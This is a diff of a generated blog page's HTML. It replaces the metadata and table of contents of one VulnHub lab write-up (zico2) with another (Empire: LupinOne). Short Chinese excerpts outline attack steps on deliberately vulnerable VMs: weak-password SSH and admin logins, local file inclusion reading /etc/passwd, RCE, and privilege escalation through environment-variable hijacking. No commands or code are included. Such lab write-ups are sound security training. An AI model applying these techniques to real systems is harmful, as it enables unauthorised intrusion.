+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Empire%EF%BC%9ALupinOne"><span class="toc-number">1.</span> <span class="toc-text">Empire：LupinOne</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH"><span class="toc-number">1.1.1.</span> <span class="toc-text">SSH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.2.1.</span> <span class="toc-text">环境变量劫持</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -502,13 +515,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "ALL",
-          title: "VulnHub zico2：1",
-          url: "http://example.com/2026/04/01/zico2%201/",
+          title: "VulnHub Empire：LupinOne",
+          url: "http://example.com/2026/05/08/Empire%20LupinOne/",
           excerpt: "",
           description: "",
-          stripContent: "zico2: 1项目地址：https://download.vulnhub.com/btrsys/BTRSys1.rar 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  本地文件包含page查看 80 端口发现有使用文件包含函数  尝试读取 /etc/passwd 文件成功  弱口令phpLiteAdmin扫描目录发现另一个后台 /dbadmin/  弱口令 admin 登录成功  RCEphpLiteAdmin在 Ph",
-          date: "Wed Apr 01 2026 16:39:00 GMT+0800",
-          updated: "Tue Apr 14 2026 21:25:31 GMT+0800",
+          stripContent: "Empire：LupinOne项目地址：https://download.vulnhub.com/empire/01-Empire-Lupin-One.zip 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  弱口令SSH访问 80 端口只有一张图片，查看页面源代码找到注释  访问 /robots.txt 拿到线索  访问 /~myfiles 回显 404，页面源代码有注释  扫描目录找到一个 /~secret，得到如下信",
+          date: "Fri May 08 2026 08:20:00 GMT+0800",
+          updated: "Fri May 08 2026 11:12:40 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
